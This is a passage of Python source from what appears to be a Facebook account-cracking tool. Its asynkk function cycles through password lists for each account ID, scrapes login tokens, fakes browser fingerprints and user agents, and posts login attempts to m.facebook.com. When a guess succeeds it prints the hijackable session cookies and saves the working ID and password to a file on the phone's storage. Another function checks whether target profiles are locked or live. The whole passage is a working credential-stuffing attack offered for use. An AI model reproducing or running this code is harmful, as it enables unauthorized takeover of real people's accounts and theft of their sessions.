                    coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=en_GB" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
                    print('\033[1;32m [COOKIES] '+coki)
                    print('\033[1;32m [USERAGENT] '+ua)
                    open('/sdcard/GENERAL-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif "checkpoint" in ses.cookies.get_dict():
                print('\r\r \033[1;30m[GENERAL-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/GENERAL-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
            
def asynkk(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[ Async Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            ses = requests.Session()
            ua = random.choice(ugen)
            link = ses.get("https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1")
            data = {
            "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
            "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
            "try_number": "0",
            "unrecognized_tries": "0",
            "email": ids,
            "prefill_contact_point": f"{ids} {pas}",
            "prefill_source": "browser_dropdown",
            "prefill_type": "password",
            "first_prefill_source": "browser_dropdown",
            "first_prefill_type": "contact_point",
            "had_cp_prefilled": True,
            "had_password_prefilled": True,
            "is_smart_lock": False,
            "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
            "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
            "encpass": f"#PWD_BROWSER:0:{str(KontolMemekSiaAnjingKontolAsuMemekBagong()).split('.')[0]}:{password}",
            "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
            "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
            }
            head = {"Host": "m.facebook.com", "content-length": f"{str(len(data))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": "https://m.facebook.com", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1", "accept-encoding": "gzip, deflate", "accept-language": "en-GB;q=0.9,en-GB;q=0.8,en;q=0.7"}
            reqx = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data=data, headers=head, allow_redirects=True)
            r = reqx.json()
            if "c_user" in ses.cookies.get_dict():
                try:
                    uid=r['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[GENERAL-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    cooz = ses.cookies.get_dict()
                    coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=en_GB" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
                    print('\033[1;32m [COOKIES] '+coki)
                    print('\033[1;32m [USERAGENT] '+ua)
                    open('/sdcard/GENERAL-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif "checkpoint" in ses.cookies.get_dict():
                print('\r\r \033[1;30m[GENERAL-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/GENERAL-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
            
def lock_check(uid):
    sessionx=requests.Session()
    urlx=f'https://www.facebook.com/p/{uid}'
    req=bxx(sessionx.get(urlx).content,'html.parser')
    tx=req.find('title').text
    if tx =='Facebook':
        return('LOCK')
    else:
        return('LIVE')
#-------------end----------------#
DEMON()
